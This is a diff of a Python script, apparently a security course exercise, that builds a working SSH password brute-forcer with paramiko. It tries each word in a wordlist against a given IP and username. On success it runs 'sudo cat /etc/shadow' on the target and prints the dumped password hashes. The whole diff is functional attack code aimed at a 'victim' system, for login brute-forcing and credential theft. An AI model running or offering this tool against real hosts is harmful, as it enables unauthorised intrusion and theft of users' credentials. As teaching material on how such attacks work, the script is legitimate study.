@@ -7,52 +7,55 @@
 # Resources used: google, stackoverflow, github demo, chatgpt
 
 # MAIN REQS:
+# Authenticate to an SSH server by its IP address.
+# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
 
+# OPTIONAL REQS: (aka Stretch Goals)
+# Dump the user credential hashes of the victim system and print them to the screen.
 
 import sys    # for args and sys.exit() to kill the script
 import time   # for time.sleep() timeout
 
-import paramiko
+import paramiko # for SSH connections and remote execution
 
 ### FUNCTIONS ####
 
+# SSH connect to <host> on <port> using <username>:<pw>
 def connect_ssh(host, username, pw, port=22):
-    print(f"[{username}@{host}] Trying password '{pw}': ", end="")
+    print(f"[{username}@{host}] Trying password '{pw}':\t", end="")
+    
+    # set up an SSH client object
     ssushi = paramiko.SSHClient()
-    ssushi.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+    ssushi.set_missing_host_key_policy(paramiko.AutoAddPolicy)  
     
-    try:
-      # Create the SSH connection with info: host, port, username, and password. 
-      ssushi.connect(host, port, username, pw)
-      # print useful information if connected!
-      print("SUCCESS!")
-      return ssushi
+    try:  # attempt connection
+      ssushi.connect(host, port, username, pw)  # attempt connection with given credentials
+      print("SUCCESS!") # boom
+      return ssushi     # return connection handle
     
-    except paramiko.AuthenticationException:
+    except paramiko.AuthenticationException:  # bad login
       print("fail")
       return None
 
-    except KeyboardInterrupt:
+    except KeyboardInterrupt:   # Ctrl+C interrupt
       print("\nStopped by user. Exiting...")
-      sys.exit() # this is Ctrl + C
+      sys.exit()
 
    
 
 #### MAIN ####
 
-try:
-    ip = sys.argv[1]
-    user = sys.argv[2]
-    wordlist = sys.argv[3]
-except:# Exception as exc:
-    #print("exc=", exc)
+
+try:    # grab parameters from script arguments
+    ip = sys.argv[1]        # target ip
+    user = sys.argv[2]      # username for SSH login
+    wordlist = sys.argv[3]  # dictionary file
+except: # incorrect number of args
     print("Invalid arguments.\n" \
-          "Please provide 3 arguments for this script:\n" \
+          "Please provide 3 arguments for this script.\n" \
           "Format: <ip> <username> <wordlist>\n\n" \
           "Exiting...")
     sys.exit()
-
-#input(f'{user}@{ip} using {wordlist} for lookup')
 
 
 # if len(sys.argv) > 1:
@@ -65,10 +68,10 @@ except:# Exception as exc:
 # menu loop
 while True:
     time.sleep(1)
-    print("\n>>> Password Iterator v1.0 <<<")
+    print("\n>>> Password Iterator v2.0 <<<")
     print("Select the operation to perform:" \
-          "\n\t1. Dictionary Iterator" \
-          "\n\t2. Password Lookup" \
+          f"\n\t1. SSH Dictionary Attack on {ip}" \
+          f"\n\t2. Password Lookup in {wordlist}" \
           "\n\t0. Exit")
 
     op = -1  # holds user input
@@ -90,21 +93,20 @@ while True:
         try:
             file = open(wordlist, "rt")
             for pw in file:   # iterate over each line/word in the wordlist
-               ssh = connect_ssh(ip, user, pw.strip())
-               if (ssh != None):
+               ssh = connect_ssh(ip, user, pw.strip())  # try pw for SSH login
+               if (ssh != None):  # valid SSH socket?
                   try:
                       print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
                       ssh_in, ssh_out, ssh_err = ssh.exec_command('sudo cat /etc/shadow | grep -v -e "*" -e "!"')
                       print(ssh_out.read().decode("ASCII"))
                       print("^^^ END OF HASHES ^^^")
                   
-                  except Exception as exc:
+                  except Exception as exc:  # it's broken
                       print(f"Error retrieving password hashes. Exception: {exc}")
                   
-                  break
-                  sys.exit()  # exit script after finding the right password
+                  break   # exit the loop after finding the right password
 
-               time.sleep(1)
+               time.sleep(1)  # delay before trying the next pw
         except FileNotFoundError: print(f"File {wordlist} does not exist")
 
       if op == 2:   # password lookup
